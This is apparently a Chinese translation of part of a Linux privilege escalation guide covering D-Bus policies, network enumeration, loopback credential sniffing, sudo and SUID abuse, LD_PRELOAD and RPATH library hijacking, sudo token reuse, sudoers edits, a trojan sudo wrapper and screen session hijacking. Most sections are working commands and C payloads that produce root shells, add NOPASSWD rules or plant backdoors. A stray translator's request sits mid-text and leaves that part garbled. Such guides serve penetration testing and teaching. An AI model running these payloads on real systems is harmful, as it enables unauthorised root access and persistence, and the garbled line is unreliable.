D-Bus 是一个复杂的 inter-Process Communication (IPC) 系统，使应用能够高效地交互和共享数据。它为现代 Linux 系统设计，提供了一个强健的框架来支持不同形式的应用间通信。

该系统功能多样，支持用于增强进程间数据交换的基本 IPC，类似于 **enhanced UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的关于来电的信号可以促使音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化了应用间的服务请求和方法调用，优化了传统上较为复杂的流程。

D-Bus 基于 **allow/deny model** 运行，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互，可能通过滥用这些权限导致 privilege escalation。

下面给出了 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的示例，详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有用户，而“default”上下文策略适用于未被其他特定策略覆盖的所有情形。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此学习如何枚举并利用 D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并确定机器的位置通常很有用。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### 出站过滤快速排查

如果主机可以运行命令但 callbacks 失败，快速区分 DNS、transport、proxy 和 route 过滤：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 开放端口

在访问机器之前，务必检查在该机器上运行但你之前无法交互的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
按绑定目标对监听器进行分类：

- `0.0.0.0` / `[::]`: 在所有本地接口上暴露。
- `127.0.0.1` / `::1`: 仅限本地（good tunnel/forward candidates）。
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): 通常只能从内部网络段访问。

### 本地专用服务排查流程

当你 compromise 一台主机时，绑定到 `127.0.0.1` 的服务通常会在你的 shell 中首次变得可达。一个快速的本地工作流程是：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as a network scanner (network-only mode)

除了本地 PE 检查之外，linPEAS 还可以作为一个专注的网络扫描器运行。它使用 `$PATH` 中可用的二进制（通常为 `fping`, `ping`, `nc`, `ncat`），并且不会安装任何工具。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
如果在不带 `-t` 的情况下传入 `-d`、`-p` 或 `-i`，linPEAS 会表现为一个纯粹的 network scanner（跳过其余的 privilege-escalation 检查）。

### Sniffing

检查你是否能 sniff traffic。如果可以，你可能能够抓取一些 credentials。
```
timeout 1 tcpdump
```
快速实用检查：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) 在 post-exploitation 中尤其有价值，因为许多仅限内部的服务会在上面暴露 tokens/cookies/credentials：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
请粘贴 src/linux-hardening/privilege-escalation/README.md 的内容。我会把可翻译的英文文本翻成中文，严格保留所有代码、技术名词、平台名、链接、路径和标签不变，并保持原有的 Markdown/HTML 语法不改。
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 用户

### 通用枚举

检查你是 **谁**、你拥有哪些 **权限**、系统中有哪些 **用户**、哪些可以 **登录** 以及哪些拥有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

某些 Linux 版本受一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提权。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用: **`systemd-run -t /bin/bash`**

### 组

检查你是否是可能授予你 root 权限的 **某个组的成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你 **知道环境中的任何密码**，请 **尝试使用该密码以每个用户身份登录**。

### Su Brute

如果你不介意制造大量噪音并且目标机器上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试暴力破解用户。

## 可写 PATH 滥用

### $PATH

如果你发现你可以 **在 $PATH 的某个文件夹中写入**，你可能能够通过 **在该可写文件夹中创建一个后门** 来提升权限，后门的名称应为某个将由不同用户（理想情况下为 root）执行的命令，并且该命令 **不会从位于你可写文件夹之前的文件夹中加载**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些二进制文件可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些**意想不到的命令允许你读取和/或写入文件，甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知晓密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在可以通过将一个 ssh 密钥添加到 root 目录或调用 `sh` 来轻松获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

这个指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例，**基于 HTB machine Admirer**，**vulnerable** 于 **PYTHONPATH hijacking**，可在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### 通过 sudo env_keep 保留 BASH_ENV → root shell

如果 sudoers 保留 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- 为什么有效：对于非交互 shell，Bash 会在运行目标脚本之前评估 `$BASH_ENV` 并 source 那个文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 权限被 source。

- Requirements:
- 你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固:
- 从 `env_keep` 中移除 `BASH_ENV`（和 `ENV`），优先使用 `env_reset`。
- 避免为允许 sudo 的命令使用 shell 包装器；使用最小的二进制文件。
- 当使用被保留的环境变量时，考虑启用 sudo 的 I/O 日志记录和告警。

### 使用 sudo 且保留 HOME 时的 Terraform (!env_reset)

如果 sudo 在允许运行 `terraform apply` 时保留了环境（`!env_reset`），则 `$HOME` 仍然是调用者的主目录。Terraform 因此会以 root 身份加载 **$HOME/.terraformrc**，并遵循 `provider_installation.dev_overrides`。

- 将所需的 provider 指向一个可写目录，并放置一个以该 provider 命名的恶意插件（例如，`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 的 Go plugin handshake 会失败，但在崩溃前会以 root 身份执行 payload，留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 验证绕过

Terraform 变量可以通过 `TF_VAR_<name>` 环境变量提供，当 sudo 保留环境时这些变量会保留。像 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱验证可以被 symlinks 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform 解析符号链接并将真实的 `/root/root.txt` 复制到攻击者可读取的目标。相同的方法也可以用于通过预先创建目标符号链接将内容 **写入** 特权路径（例如，将 provider 的目标路径指向 `/etc/cron.d/` 内）。

### requiretty / !requiretty

在一些较旧的发行版中，sudo 可以通过 `requiretty` 配置，强制 sudo 只能在交互式 TTY 中运行。如果设置了 `!requiretty`（或该选项不存在），sudo 就可以从非交互式上下文执行，例如 reverse shells、cron jobs 或 scripts。
```bash
Defaults !requiretty
```
这本身不是一个直接的漏洞，但它扩大了在不需要完整 PTY 的情况下滥用 sudo 规则的场景。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH` 或 `secure_path` 包含攻击者可写的条目（例如 `/home/<user>/bin`），那么 sudo 允许的目标中任何使用相对路径的命令都可以被替换（shadowed）。

- 前提条件：一条 sudo 规则（通常为 `NOPASSWD`），运行一个脚本/二进制，该脚本在调用命令时不使用绝对路径（例如 `free`, `df`, `ps` 等），并且 PATH 中存在一个可写且被优先搜索的条目。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**跳转** 阅读其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 命令/SUID 二进制 未指定命令路径

如果将 **sudo 权限** 授予单个命令 **而未指定路径**：_hacker10 ALL= (root) less_，你可以通过修改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
该技术也可以用于当一个 **suid** 二进制 **在执行另一个命令时未指定该命令的路径（始终使用** _**strings**_ **检查可疑 SUID 二进制的内容）**。

[Payload examples to execute.](payloads-to-execute.md)

### 带命令路径的 SUID 二进制

如果 **suid** 二进制 **执行另一个命令并指定了路径**，则可以尝试 **export a function**，函数名与 suid 文件调用的命令相同。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并 export 它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid binary 时，这个函数将被执行

### 可写脚本由 SUID wrapper 执行

一个常见的自定义应用错误配置是一个 root-owned SUID binary wrapper 会执行一个脚本，而该脚本本身可被 low-priv users 写入。

典型模式：
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
快速检查：
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
这种攻击路径在位于 `/usr/local/bin` 的“maintenance”/“backup” 封装程序中尤其常见。

### LD_PRELOAD & **LD_LIBRARY_PATH**

环境变量 **LD_PRELOAD** 用于指定一个或多个共享库（.so 文件），由加载器在其他所有库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

然而，为了维护系统安全并防止该功能被利用，尤其是在 **suid/sgid** 可执行文件上，系统强制执行以下条件：

- 对于真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配的可执行文件，加载器会忽略 **LD_PRELOAD**。
- 对于具有 suid/sgid 的可执行文件，仅预加载位于标准路径且也具有 suid/sgid 的库。

如果你可以使用 `sudo` 执行命令，并且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生权限提升。该配置允许 **LD_PRELOAD** 环境变量在通过 `sudo` 运行命令时仍然保留并被识别，从而可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **compile it** 使用：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后， **escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env variable，则可以滥用相似的 privesc，因为攻击者控制了库的搜索路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来不寻常的二进制文件时，最好检查它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明存在潜在的利用可能性。

要利用这一点，可以通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，并包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
该代码在编译并执行后，旨在通过修改文件权限并执行具有提升权限的 shell 来提升权限。

将上述 C 文件编译为共享对象 (.so) 文件，命令：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应当触发 exploit，从而可能导致系统被攻陷。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个从我们可以写入的文件夹加载库的 SUID binary，让我们在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个收集的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 提供相同的内容，但适用于你**只能注入参数**的命令场景。

该项目收集了 Unix 二进制的合法功能，这些功能可被滥用于 break out restricted shells、escalate 或 maintain elevated privileges、transfer files、spawn bind and reverse shells，并促进其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你能运行 `sudo -l`，你可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找到利用任意 sudo 规则的方法。

### Reusing Sudo Tokens

在拥有 **sudo access** 但不知道密码的情况下，你可以通过等待 sudo 命令执行，然后劫持会话 token 来提权。

提权所需条件：

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 已在 **过去 15mins** 使用过 `sudo` 来执行某些命令（默认这是 sudo token 的持续时间，允许我们在不输入密码的情况下使用 `sudo`）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可用（你可以上传它）

（你可以临时通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 启用 ptrace_scope，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久启用）

如果满足所有这些条件，**你可以使用：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) 来提权

- 第一个 **exploit** (`exploit.sh`) 会在 _/tmp_ 创建二进制文件 `activate_sudo_token`。你可以使用它来 **激活你会话中的 sudo token**（你不会自动得到 root shell，需要执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个 sh shell，**由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 该 **第三个 exploit** (`exploit_v3.sh`) 将 **创建一个 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或该文件夹内任意已创建文件拥有**写权限**，可以使用二进制程序 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_ 并且以该用户身份拥有 PID 1234 的 shell，你可以在不需要知道密码的情况下通过以下操作**获取 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 目录下的文件配置了谁可以使用 `sudo` 以及如何使用。 这些文件 **默认只能被 root 用户和 root 组读取**。\
**如果** 你能 **读取** 这个文件，你可能能够 **获得一些有趣的信息**，如果你能 **写入** 任意文件，你将能够 **提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可以替代 `sudo` 二进制文件的工具，例如面向 OpenBSD 的 `doas`，记得检查其配置（位于 `/etc/doas.conf`）。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个**用户通常连接到一台机器并使用 `sudo`** 提权，并且你已经在该用户上下文内获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它会先以 root 身份执行你的代码，然后再执行该用户的命令。接着，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会执行你的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个例子。

或者运行类似：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

The file `/etc/ld.so.conf` indicates **已加载的配置文件来自哪里**。 Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. These configuration files **指向其他文件夹**，系统将在这些目录中**搜索库**。For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **这意味着系统会在 `/usr/local/lib` 中搜索库**。

If for some reason **某个用户对以下路径具有写权限**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
请查看以下页面，了解**如何利用此错误配置**：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将被程序在此处使用，正如 `RPATH` 变量所指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities 为进程提供可用 root 权限的一个 **子集**。这实际上将 root **权限分解为更小且独立的单元**。每个单元都可以单独授予给进程。这样可以减少完整权限集，从而降低被利用的风险。\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

在目录中，**bit for "execute"** 意味着受影响的用户可以 "**cd**" 进入该文件夹。\
**"read"** bit 表示用户可以 **list** **files**，而 **"write"** bit 表示用户可以 **delete** 和 **create** 新的 **files**。

## ACLs

Access Control Lists (ACLs) 表示可自由裁量权限的二级层，能够 **overriding the traditional ugo/rwx permissions**。这些权限通过允许或拒绝非所有者或非组成员的特定用户的访问权来增强对文件或目录访问的控制。此级别的 **granularity ensures more precise access management**。更多细节请见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" 赋予文件的读写权限：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins 上的隐藏 ACL 后门

一个常见的错误配置是在 `/etc/sudoers.d/` 下拥有者为 root、权限为 `440` 的文件，仍然通过 ACL 授予低权限用户写访问权限。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
如果你看到类似 `user:alice:rw-` 的条目，该用户即使在受限的模式位下也可以添加一条 sudo 规则：
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
这是一个高影响的 ACL persistence/privesc 路径，因为在仅通过 `ls -l` 审查时很容易被遗漏。

## 打开 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 不同用户（**root**）的某个 **shell** 会话。\
在 **最新版本** 中，你只能 **connect** 到属于 **你自己的用户** 的 screen 会话。但你仍然可能在会话内发现 **有趣的信息**。

### screen 会话 hijacking

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是一个针对 **old tmux versions** 的问题。我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
